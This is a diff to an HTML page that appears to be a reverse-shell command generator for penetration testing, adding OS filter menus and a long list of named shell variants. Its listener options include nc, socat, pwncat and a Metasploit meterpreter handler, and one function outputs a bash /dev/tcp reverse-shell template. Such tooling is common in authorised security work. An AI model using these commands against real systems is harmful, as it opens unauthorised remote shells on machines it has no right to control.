@@ -23,6 +23,41 @@
 body {
     font-family: 'Nunito Sans';font-size: 20px;
 }
+ 
+[contenteditable] {
+  outline: 0px solid transparent;
+}
+.filterDiv {
+  float: left;
+   white-space: nowrap;
+  text-align: center;
+  margin: 2px;
+  display: none;
+}
+.show {
+  display: block;
+}
+
+.container {
+  margin-top: 20px;
+  overflow: hidden;
+}
+
+.btn {
+  border: none;
+  outline: none;
+  padding: 12px 16px;
+  background-color: #f1f1f1;
+  cursor: pointer;
+}
+.btn:hover {
+  background-color: #ddd;
+}
+
+.btn.active {
+  background-color: #666;
+  color: white;
+}
 
 /* Style the tab */
 .tab {
@@ -47,6 +82,13 @@ body {
   transition: 0.3s;
   font-size: 17px;
 }
+#mydiv {
+ 
+  width:100%;
+  height: 100px;
+  display: flex;
+  flex-wrap:wrap;
+}
 
 /* Change background color of buttons on hover */
 .tab button:hover {
@@ -70,8 +112,9 @@ body {
 
 .vertical-menu {
   width: 200px;
-  height: 200px;
+  height: 400px;
   overflow-y: auto;
+   flex-wrap:nowrap;
 }
 
 .vertical-menu a {
@@ -94,14 +137,26 @@ body {
 .float-container {
     border: 3px solid #fff;
     padding: 20px;
+   flex-wrap:wrap;
 }
 
 .float-child {
     width: 100%;
     float: left;
     padding: 20px;
-     
+ flex-wrap:wrap;
 }  
+
+.container{
+    display: flex;
+  flex-wrap:wrap;
+}
+.fixed{
+    width: 200px;
+}
+.flex-item{
+    flex-grow: 1;
+}
 </style>
   
 </head>
@@ -161,7 +216,7 @@ body {
   
     <label for="type">Type:</label>
 
-<select class="type" name="type">
+<select class="type" name="type" >
 
 <option value="choose one"> </option>
   <option value="nc -lvnp ">nc</option>
@@ -172,34 +227,33 @@ body {
   <option value="rcat -lHp ">rustcat + Command History</option>
    <option value="python3 -m pwncat -lp ">pwncat</option>
     <option value="stty raw -echo; (stty size; cat) | nc -lvnp ">windows ConPty</option>
-     <option value="socat -d -d TCP-LISTEN:">socat</option>
+    
+ 
+   
+     <option value="socat -d -d TCP-LISTEN:" >socat</option>
+ 
+     
       <option value="socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:">socat (TTY)</option>
        <option value="powercat -l -p ">powercat</option>
-        <option value="msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost"">msfconsole</option>
+        <option value="msfconsole -q -x ">msfconsole</option>
         
 </select>
  
  <div class="result"></div>
  
-   <p id="input port"></p>
+ <p id="demo"></p>
+  <p id="MSF"></p>
+   <p id="input port"> </p>
+    <p id="socat"></p>
+       <p id="MSF2"></p>
 
+     
+    
    <div class="w3-container">
   <h3 class="w3-text-theme">  
  
   <script>
-  
-  //  var ip= document.getElementById("ip").value;
-  //document.write("nc -lvnp" +" "+ ip);
-/*
-const input = document.querySelector('input');
-const log = document.getElementById('log');
-
-input.addEventListener('change', updateValue);
-
-function updateValue(e) {
-  log.textContent = e.target.value;
-}
-*/
+ 
 
 function myFunction() {
   var x = document.getElementById("ip").value;
@@ -209,21 +263,50 @@ function myFunction() {
 function secFunction() {
   var x = document.getElementById("port").value;
   document.getElementById("input port").innerHTML = x;
-}
+  }
+
 
   const selectElement = document.querySelector('.type');
 
 selectElement.addEventListener('change', (event) => {
   const result = document.querySelector('.result');
+ 
+ 
 result.textContent = `  ${event.target.value}`;
+
 });
 
+  </script>  
+ <div class=" w3-large">
+ <div <button onclick="specialFunction()">if its socat,click me</button> </div>
+ 
+ <div <button onclick="MSFFunction()">if its MSF,click me</button> </div>
+ 
+ 
+</div>
+
+<script>
+ 
+
+function specialFunction() {
+ document.getElementById("socat").innerHTML = " STDOUT";
+}
+
+function MSFFunction() {
+
+   
+ document.getElementById("MSF").innerHTML = "; set lport ";
+ 
+  document.getElementById("MSF2").innerHTML = "; exploit";
+ 
+ 
+}
+</script>
+    
 
 
 
 
-  </script> 
-  
 <h1> </h1>
 </h3>
   </div>
@@ -240,7 +323,7 @@ result.textContent = `  ${event.target.value}`;
   
 <hr>
 
-<div class="w3-border">
+ 
 <div class="w3-center">
 <div class="w3-bar w3-theme">
 
@@ -253,32 +336,22 @@ result.textContent = `  ${event.target.value}`;
 
 <div id="Reverse" class="w3-container city w3-animate-opacity">
   <div class="w3-dropdown-hover">
-    <button class="w3-button w3-theme">OS <i class="fa fa-caret-down"></i></button>
+   <div class="w3-black w3-center"> 
+  <label for="All">OS:</label>   </div>
+    <button class="w3-button w3-theme"> All <i class="fa fa-caret-down"></i></button>
     <div class="w3-dropdown-content w3-bar-block w3-border">
-        <a href="#" class="w3-bar-item w3-button">All</a>
-      <a href="#" class="w3-bar-item w3-button">Linux</a>
-      <a href="#" class="w3-bar-item w3-button">Windows</a>
-      <a href="#" class="w3-bar-item w3-button">Mac</a>
+    
+    <!-- Control buttons -->
+    <div class="vertical-menu">
+<div id="myBtnContainer">
+  <div class="w3-bar-item w3-button" onclick="filterSelection('Linux')"> Linux</div>
+  <div class="w3-bar-item w3-button" onclick="filterSelection('Windows')"> Windows</div>
+  <div class="w3-bar-item w3-button" onclick="filterSelection('Mac')"> Mac</div>
+</div>
+</div>
     </div>
   </div>
-
-<div class="w3-container">
-<div class="float-child">
-
-<div class="tab">
-  <button class="tablinks" onclick="City(event, 'Bash -i')" id="defaultOpen">Bash-i</button>
-  <button class="tablinks" onclick="City(event, 'Bash196')">Bash 196</button>
-  <button class="tablinks" onclick="City(event, 'Bash read line')">Bash read line</button>
-</div>
-
-<div id="Bash -i" class="tabcontent">
-<div class="float-child">
-  <h3 class="w3-text-theme">   <form>
-     <label for="command">Command:</label> 
-  <input type="text" id="command" name="command">
-  </form>
-  </div>
-    <div class="w3-container">
+    <div class="w3-container w3-right-align">
   <h3 class="w3-text-theme">    
   
     <label for="shell">shell:</label>
@@ -315,15 +388,111 @@ result.textContent = `  ${event.target.value}`;
  
 </select>
 
+
+  </div>
+
+ <div id="mydiv">
+ 
+<!-- The filterable elements. Note that some have multiple class names (this can be used if they belong to multiple categories) -->
+ <div class="vertical-menu ">
+
+
+  <div class="w3-bar-item w3-button filterDiv Linux Mac" onclick="bashifunction()">Bash -i</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">Bash 196</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">Bash read line</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">Bash 5</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">Bash udp</div>
+
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">nc -e</div>
+  <div class="w3-bar-item w3-button filterDiv Windows">nc.exe -e</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">nc -c</div>
+ 
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">ncat  udp</div>
+      <div class="w3-bar-item w3-button filterDiv Linux Mac">ncat -e</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">nc mkfifo</div>
+    <div class="w3-bar-item w3-button filterDiv Windows">ncat.exe -e</div>
+   <div class="w3-bar-item w3-button filterDiv Linux Mac">C     </div>
+  <div class="w3-bar-item w3-button filterDiv Windows ">C Windows</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Windows">C#</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">Haskell #1</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">Perl</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">Perl no sh</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">rustcat     </div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">PHP Emoji</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">PHP PentestMonkey</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">PHP Ivan Sincek</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">PHP cmd</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">PHP exec</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">PHP shell_exec</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">PHP system</div>
+   <div class="w3-bar-item w3-button filterDiv Linux Mac">PHP passthru</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">PHP `</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">PHP popen</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">PHP proc_open</div>
+  <div class="w3-bar-item w3-button filterDiv Windows ">Windows ConPty</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">Awk</div>
+  <div class="w3-bar-item w3-button filterDiv Windows">PowerShell #1</div>
+  <div class="w3-bar-item w3-button filterDiv Windows">PowerShell #2</div>
+  <div class="w3-bar-item w3-button filterDiv Windows">PowerShell #3</div>
+  <div class="w3-bar-item w3-button filterDiv Windows">PowerShell #4 (TLS)</div>
+  <div class="w3-bar-item w3-button filterDiv Windows ">PowerShell #3 (Base64)</div>
+   
+<div class="w3-bar-item w3-button filterDiv Linux Mac">zsh</div>
+
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">Python #1</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">Python #2</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">Python3 #1</div>
+   <div class="w3-bar-item w3-button filterDiv Linux Mac">Python3 #2</div>
+    <div class="w3-bar-item w3-button filterDiv Linux">Python3 shortest</div>
+      <div class="w3-bar-item w3-button filterDiv Linux Mac">telnet</div>
+      <div class="w3-bar-item w3-button filterDiv Linux Mac">Ruby #1</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">Ruby no sh</div>
+        <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">Dart</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">socat #1</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">socat #2 (TTY)</div>
+
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">node.js</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">node.js #2</div>
+      <div class="w3-bar-item w3-button filterDiv Windows">Groovy</div>
+      
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">Java #1</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">Java #2</div>
+   <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">Java #3</div>
+    <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">Javascript</div>
+
+  <div class="w3-bar-item w3-button filterDiv Linux ">Lua #1</div>
+  <div class="w3-bar-item w3-button filterDiv Linux Windows">Lua #2</div>
+
+  <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">Golang</div>
+
+
+
+  <div class="w3-bar-item w3-button filterDiv Linux Mac">Vlang</div>
+ 
+
+</div>
 </div>
 
-<div id="Bash196" class="tabcontent">
-  
-</div>
 
-<div id="Bash read line" class="tabcontent">
+<div class="w3-container">
+ 
+
+  <h3 class="w3-text-theme w3-center">    
+     <label for="command">Command:</label> 
+ <p id="command"></p>
 
 </div>
+</div>
+<script>
+function bashifunction() {
+  document.getElementById("command").innerHTML = "shell -i >& /dev/tcp/ip/port 0>&1";
+}
+</script>
+
+
+
+ 
+
 </div>
 
  
@@ -464,14 +633,55 @@ mybtn.click();
 // Get the element with id="defaultOpen" and click on it
 document.getElementById("defaultOpen").click();
 
-function variable()
-{
-
  
-   var ip= document.getElementById("ip").value;
-      var port= document.getElementById("port").value;
-  document.write("nc -lvnp" +" "+ ip);
- }
+ 
+ filterSelection("all")
+function filterSelection(c) {
+  var x, i;
+  x = document.getElementsByClassName("filterDiv");
+  if (c == "all") c = "";
+  // Add the "show" class (display:block) to the filtered elements, and remove the "show" class from the elements that are not selected
+  for (i = 0; i < x.length; i++) {
+    w3RemoveClass(x[i], "show");
+    if (x[i].className.indexOf(c) > -1) w3AddClass(x[i], "show");
+  }
+}
+
+// Show filtered elements
+function w3AddClass(element, name) {
+  var i, arr1, arr2;
+  arr1 = element.className.split(" ");
+  arr2 = name.split(" ");
+  for (i = 0; i < arr2.length; i++) {
+    if (arr1.indexOf(arr2[i]) == -1) {
+      element.className += " " + arr2[i];
+    }
+  }
+}
+
+// Hide elements that are not selected
+function w3RemoveClass(element, name) {
+  var i, arr1, arr2;
+  arr1 = element.className.split(" ");
+  arr2 = name.split(" ");
+  for (i = 0; i < arr2.length; i++) {
+    while (arr1.indexOf(arr2[i]) > -1) {
+      arr1.splice(arr1.indexOf(arr2[i]), 1);
+    }
+  }
+  element.className = arr1.join(" ");
+}
+
+// Add active class to the current control button (highlight it)
+var btnContainer = document.getElementById("myBtnContainer");
+var btns = btnContainer.getElementsByClassName("btn");
+for (var i = 0; i < btns.length; i++) {
+  btns[i].addEventListener("click", function() {
+    var current = document.getElementsByClassName("active");
+    current[0].className = current[0].className.replace(" active", "");
+    this.className += " active";
+  });
+}
   </script> 
  
 </script>
